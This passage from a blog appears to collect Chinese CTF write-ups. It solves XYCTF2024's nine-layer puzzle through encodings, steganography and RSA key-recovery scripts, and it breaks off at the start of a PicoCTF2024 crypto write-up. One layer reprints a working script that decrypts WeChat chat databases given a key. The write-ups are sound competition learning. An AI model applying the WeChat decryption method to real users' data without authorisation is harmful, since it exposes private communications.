      <link href="/2024/04/28/XYCTF2024-%E7%96%AF%E7%8B%82%E5%A4%A7%E6%9D%82%E7%83%A9%EF%BC%81%E4%B9%9D%E8%BD%AC%E5%8A%9F%E6%88%90%E5%A4%8D%E7%8E%B0WP/"/>
      <url>/2024/04/28/XYCTF2024-%E7%96%AF%E7%8B%82%E5%A4%A7%E6%9D%82%E7%83%A9%EF%BC%81%E4%B9%9D%E8%BD%AC%E5%8A%9F%E6%88%90%E5%A4%8D%E7%8E%B0WP/</url>
      
        <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>你能突破九大关卡修成神仙吗？</p><p>hint1：压缩包密码为比赛名称+8位什么来着？忘了。哈哈哈！</p><p>hint2：flag格式：XYCTF{md5(flag)}</p><p>hint3：第三层非夏多，看看交点</p><p>hint4：第六层键盘画图，狼蛛键盘最新版你值得拥有！</p><h1 id="开头"><a href="#开头" class="headerlink" title="开头"></a>开头</h1><p>由提示猜测压缩包密码XYCTF20240401</p><h1 id="炼气"><a href="#炼气" class="headerlink" title="炼气"></a>炼气</h1><p>第一层是天书加密，用随波逐流就可以解出压缩包密码。</p><p>第二层是一张图片，修改高就可以看到flag的第一部分：</p><blockquote><p>XYCTF{T3e_c0mb1nation_</p></blockquote><h1 id="筑基"><a href="#筑基" class="headerlink" title="筑基"></a>筑基</h1><p>第一层是<strong>BubbleBabble</strong>编码，<a href="http://www.hiencode.com/bubble.html">在线解码</a>就能解出压缩包密码。</p><p>第二层是一张图片，010看不出什么东西，用StegSolve通过LSB可以找到一串Base64编码，解码可得flag第二部分：</p><blockquote><p>0f_crypt0_and_</p></blockquote><h1 id="结丹（全复现）"><a href="#结丹（全复现）" class="headerlink" title="结丹（全复现）"></a>结丹（全复现）</h1><p>给出一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281730505.jpg" alt="hint3"></p><p>hint说看交点，可能跟Begin CTF 2023的下一站上岸差不多，四个交点为”-”，三个交点为空格，一个交点为”.”，可以转化为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">- .... . ..--.- - .... .. .-. -..</span><br></pre></td></tr></table></figure><p>摩斯密码解码就可以得到压缩包的密码</p><p>打开压缩包发现还有一层压缩包和一个txt，文本文件里面没有有用信息，但是压缩包带密码，用010打开看看，看到末尾有一段附加信息：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281828487.png" alt="image-20240428173027310"></p><p>分析特征，显然是Base64，解码之后可以得到压缩包密码，解压发现里面有一个文本文件，由特征可知是Base32，解码就可以得到flag的第三部分。</p><blockquote><p>misc_1s_re6lly_fun!!</p></blockquote><h1 id="元婴"><a href="#元婴" class="headerlink" title="元婴"></a>元婴</h1><p>hint4.txt打开一看发现是base64，解密一看salted，用这个网站解密：<a href="https://www.sojson.com/encrypt_triple_des.html">在线Triple DES加密 | Triple DES解密- 在线工具 (sojson.com)</a>（一个个试出来的），密码是2024.</p><p>拿密码打开压缩包，有个hint.txt和一个db文件，hint内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wqk：1m813onn17o040358p772q37rm137qpnqppqpn38nr704m56n2m9q22po7r05r77</span><br></pre></td></tr></table></figure><p>进行一个凯撒解密就可以得到一个key，</p><p>下面是在52上面找到的一个解密微信聊天数据库的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&quot;SQLite format 3&quot;</span>,encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)<span class="comment">#文件头</span></span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span> <span class="comment">#4048数据 + 16IV + 20 HMAC + 12</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line"><span class="comment">#yourkey</span></span><br><span class="line">password = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;...&quot;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>))<span class="comment">#这里填入上面求出的key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;...\\MSG0.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#这里填入MSG0.db的文件路径</span></span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line"></span><br><span class="line">salt = blist[:<span class="number">16</span>]<span class="comment">#微信将文件头换成了盐</span></span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)<span class="comment">#获得Key</span></span><br><span class="line"></span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]<span class="comment">#丢掉salt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import struct</span></span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x^<span class="number">0x3a</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line"></span><br><span class="line">hash_mac = hmac.new(mac_key ,digestmod = <span class="string">&#x27;sha1&#x27;</span>)<span class="comment">#用第一页的Hash测试一下</span></span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># hash_mac.update(struct.pack(&#x27;=I&#x27;,1))</span></span><br><span class="line"><span class="keyword">if</span> (hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Correct Password&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Wrong Password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">blist = [blist[i:i+DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE,<span class="built_in">len</span>(blist),DEFAULT_PAGESIZE)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;...\\ChatMsg.db&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#解密后的路径</span></span><br><span class="line">    f.write(SQLITE_FILE_HEADER)<span class="comment">#写入文件头</span></span><br><span class="line">    t = AES.new(key ,AES.MODE_CBC ,first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">            t = AES.new(key ,AES.MODE_CBC ,i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">            f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">            f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure><p>用打开数据库的软件打开解密之后的数据库（我用的Dbeaver），在MSG表里面就可以看到flag的第四部分：</p><blockquote><p>L1u_and_K1cky_Mu</p></blockquote><h1 id="化神（第二部分复现）："><a href="#化神（第二部分复现）：" class="headerlink" title="化神（第二部分复现）："></a>化神（第二部分复现）：</h1><p>hint5给出了一串字符和md5后的结果，进行爆破，爆破出压缩包密码，解压<code>第五层.zip</code> 看到flag.txt里面没有有用的东西.</p><p>serpent.txt文件里有东西，考虑serpent加密，用这个网站<a href="http://serpent.online-domain-tools.com/">Serpent Encryption – Easily encrypt or decrypt strings or files (online-domain-tools.com)</a></p><p>通过文件输入，从头到尾没有密钥，猜测密钥是前面爆破得到的key，解密之后下载下来塞进Cyberchef可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281828521.png" alt="image-20240428172659005"></p><p>导出为txt并转换编码为UTF-8后可以得到：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281726731.png" alt="image-20240428172642676"></p><p>字数比可以看到的多很多，考虑零宽字符隐写：</p><p>将文本转化为unicode编码后：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281726082.png" alt="image-20240428172606982"></p><p>筛选发现，里面包含零宽unicode字符\u200A,\u200B,\u200C,\u202C,\uFEFF</p><p>用<a href="https://www.mzy0.com/ctftools/zerowidth1/">Unicode Steganography with Zero-Width Characters (mzy0.com)</a>解码即可得出flag的第五部分：</p><blockquote><p>_3re_so_sm4rt!</p></blockquote><h1 id="炼虚（第二部分复现）："><a href="#炼虚（第二部分复现）：" class="headerlink" title="炼虚（第二部分复现）："></a>炼虚（第二部分复现）：</h1><p>第一层是键盘画图，是一个句子，不确定的字母可以掩码爆破。</p><p>用上面得到的密码打开压缩包，可以看到一个压缩包，一个word文档，一个Excel文档，一个PPT，一个文本文件还有一张图片。除了图片之外，都没有看到有什么有用的，直接用steghide提取一下，发现要密码，发现上面几个文件名称都是数字，倒着来输一遍（98641）就是密码（纯猜谜），提取出来就可以得到flag的第六部分：</p><blockquote><p>In_just_a_few_m1nutes_</p></blockquote><h1 id="合体"><a href="#合体" class="headerlink" title="合体"></a>合体</h1><p>第一层UTF-7加维吉尼亚，密钥是字母表。</p><p>解开压缩包可以看到一个图片：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281724825.png" alt="flag"></p><p>就一个八进制，按颜色填数字就行，八进制转换之后就可以得到flag的第七部分：</p><blockquote><p>they_were_thr0ugh!</p></blockquote><h1 id="大乘"><a href="#大乘" class="headerlink" title="大乘"></a>大乘</h1><p>这一层的第一部分是一个RSA，显然是p^q泄露，加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line">flag=<span class="string">b&quot;password&#123;xxxxx&#125;&quot;</span></span><br><span class="line">p,q= getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p^q=&quot;</span>,p^q)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837</span></span><br><span class="line"><span class="string">c= 1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357</span></span><br><span class="line"><span class="string">p^q= 14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>解密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>)<span class="comment">#随便设置，但是不能不设置，增大递归深度限制</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_high_xor</span>(<span class="params">p=<span class="string">&quot;&quot;</span>, q=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    lp, lq = <span class="built_in">len</span>(p), <span class="built_in">len</span>(q)</span><br><span class="line">    tp0 = <span class="built_in">int</span>(p + (<span class="number">1024</span>-lp) * <span class="string">&quot;0&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tq0 = <span class="built_in">int</span>(q + (<span class="number">1024</span>-lq) * <span class="string">&quot;0&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tp1 = <span class="built_in">int</span>(p + (<span class="number">1024</span>-lp) * <span class="string">&quot;1&quot;</span>, <span class="number">2</span>)</span><br><span class="line">    tq1 = <span class="built_in">int</span>(q + (<span class="number">1024</span>-lq) * <span class="string">&quot;1&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tp0 * tq0 &gt; n <span class="keyword">or</span> tp1 * tq1 &lt; n:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> lp == leak_bits:</span><br><span class="line">        pq.append(tp0)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> xor[lp] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;0&quot;</span>, q + <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;1&quot;</span>, q + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;0&quot;</span>, q + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        pq_high_xor(p + <span class="string">&quot;1&quot;</span>, q + <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_low_xor</span>(<span class="params">p=<span class="string">&quot;&quot;</span>, q=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    lp, lq = <span class="built_in">len</span>(p), <span class="built_in">len</span>(q)</span><br><span class="line">    tp = <span class="built_in">int</span>(p, <span class="number">2</span>) <span class="keyword">if</span> p <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    tq = <span class="built_in">int</span>(q, <span class="number">2</span>) <span class="keyword">if</span> q <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tp * tq % <span class="number">2</span>**lp != n % <span class="number">2</span>**lp:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> lp == leak_bits:</span><br><span class="line">        pq.append(tp)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> xor[-lp-<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        pq_low_xor(<span class="string">&quot;0&quot;</span> + p, <span class="string">&quot;1&quot;</span> + q)</span><br><span class="line">        pq_low_xor(<span class="string">&quot;1&quot;</span> + p, <span class="string">&quot;0&quot;</span> + q)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pq_low_xor(<span class="string">&quot;0&quot;</span> + p, <span class="string">&quot;0&quot;</span> + q)</span><br><span class="line">        pq_low_xor(<span class="string">&quot;1&quot;</span> + p, <span class="string">&quot;1&quot;</span> + q)</span><br><span class="line"></span><br><span class="line">n = ...</span><br><span class="line">c = ...</span><br><span class="line">mask = (<span class="number">1</span>&lt;&lt;<span class="number">1024</span>)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">leak_bits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">leak = ...</span><br><span class="line">xor = <span class="built_in">bin</span>(leak)[<span class="number">2</span>:].zfill(<span class="number">1024</span>)</span><br><span class="line">pq = []</span><br><span class="line">pq_low_xor()</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pq:</span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(<span class="number">65537</span>,phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到密码解开压缩包，可以见到一个txt，打开看到一堆no和yes，将no替换为0，yes替换为1，通过下述脚本转换为图片：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;temp.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line">    pic = Image.new(<span class="string">&quot;L&quot;</span>,(<span class="number">548</span>,<span class="number">72</span>))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">548</span>):</span><br><span class="line">            <span class="keyword">if</span> s[h * <span class="number">548</span> + w] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                pic.putpixel((w,h),<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pic.putpixel((w,h),<span class="number">255</span>)</span><br><span class="line">    pic.save(<span class="string">&quot;out.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281828921.png" alt="out"></p><p>是须弥沙漠文，对字母表换就行，下附字母表</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202404281829364.png" alt="fcd8e8310bde689198d4be3e6b749f15_9129134670435119053"></p><p>换完就可以得到flag的第八部分：</p><blockquote><p>sm3rty0ucando</p></blockquote><h1 id="渡劫（第二部分复现）"><a href="#渡劫（第二部分复现）" class="headerlink" title="渡劫（第二部分复现）"></a>渡劫（第二部分复现）</h1><p>这一层的第一部分是一个RSA，很简单，加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    a, b = randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">8</span>), randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">    <span class="built_in">list</span>.append(a * p + b * q)</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&quot;xxxxx&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(password), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">list</span> = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707</span></span><br><span class="line"><span class="comment">#c = 46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495</span></span><br><span class="line"><span class="comment">#list = [618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318, 837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197]</span></span><br></pre></td></tr></table></figure><p>解密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = ...</span><br><span class="line">c = ...</span><br><span class="line"><span class="built_in">list</span> = [..., ...]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.gcd(<span class="built_in">list</span>[<span class="number">0</span>]*a1-<span class="built_in">list</span>[<span class="number">1</span>]*a2,n)!=<span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(<span class="built_in">list</span>[<span class="number">0</span>]*a1-<span class="built_in">list</span>[<span class="number">1</span>]*a2,n)!=n):</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(<span class="built_in">list</span>[<span class="number">0</span>]*a1-<span class="built_in">list</span>[<span class="number">1</span>]*a2,n))<span class="comment">#这里求出来是q</span></span><br><span class="line"><span class="comment">#--------part2--------</span></span><br><span class="line">q = ...</span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>解开压缩包就是一个带图片的压缩包和一个txt，txt内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">压缩包里的图片真的有东西吗？不如看向外面</span><br></pre></td></tr></table></figure><p>图片里面确实没有东西，由压缩包名字“我们的小秘密嘿嘿”猜测是oursecret隐写，猜测密码是上面解出来的，尝试发现是正确的，就可以得到flag的第九部分：</p><blockquote><p>_nine_turns?}</p></blockquote><h1 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h1><p>组合之后：</p><blockquote><p>XYCTF{T3e_c0mb1nation_0f_crypt0_and_misc_1s_re6lly_fun!!L1u_and_K1cky_Mu_3re_so_sm4rt!In_just_a_few_m1nutes_they_were_thr0ugh!Sm3rt_y0u_can_do_nine_turns?}</p></blockquote><p>注意，第八段开头需要大写，然后要按词加下划线得到flag之后要整体用md5加密之后再包上XYCTF{}才是flag。</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicoCTF2024 Crypto部分WP</title>
      <link href="/2024/03/29/PicoCTF2024-Crypto%E9%83%A8%E5%88%86WP/"/>
      <url>/2024/03/29/PicoCTF2024-Crypto%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="感想">感想</h2><p>这可能是我打的第一个参与度比较高的国外的CTF，前面四道没什么难度，但是被flag_printer卡了很久，估计一时半会忘不掉这道题.</p><h2 id="interencdec">interencdec</h2><p>签到题</p><p>密文如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclgyZzBOMm8yYXpZNWZRPT0nCg==</span><br></pre></td></tr></table></figure><p>显然是Base64编码，解码得到结果如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2g0N2o2azY5fQ==&#x27;</span><br></pre></td></tr></table></figure><p>去除<strong>b''</strong>之后进行Base64解码结果如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpjvJAM&#123;jhlzhy_k3jy9wa3k_h47j6k69&#125;</span><br></pre></td></tr></table></figure><p>进行一次偏移量为7的凯撒解密可以得到flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">picoCTF&#123;caesar_d3cr9pt3d_a47c6d69&#125;</span><br></pre></td></tr></table></figure><h2 id="custom-encryption">Custom encryption</h2><p>题目给出加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">g, x, p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, x) % p<span class="comment">#实际上就是pow(g,x,p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        cipher.append(((<span class="built_in">ord</span>(char) * key*<span class="number">311</span>)))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> p % i == <span class="number">0</span>:</span><br><span class="line">            v = v + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_encrypt</span>(<span class="params">plaintext, text_key</span>):</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext[::-<span class="number">1</span>]):<span class="comment">#将字符串反转后异或加密</span></span><br><span class="line">        key_char = text_key[i % key_length]</span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))</span><br><span class="line">        cipher_text += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">plain_text, text_key</span>):</span><br><span class="line">    p = <span class="number">97</span></span><br><span class="line">    g = <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p) <span class="keyword">and</span> <span class="keyword">not</span> is_prime(g):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Enter prime numbers&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    a = randint(p-<span class="number">10</span>, p)</span><br><span class="line">    b = randint(g-<span class="number">10</span>, g)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">    u = generator(g, a, p)</span><br><span class="line">    v = generator(g, b, p)</span><br><span class="line">    key = generator(v, a, p)</span><br><span class="line">    b_key = generator(u, b, p)</span><br><span class="line">    shared_key = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> key == b_key:</span><br><span class="line">        shared_key = key</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    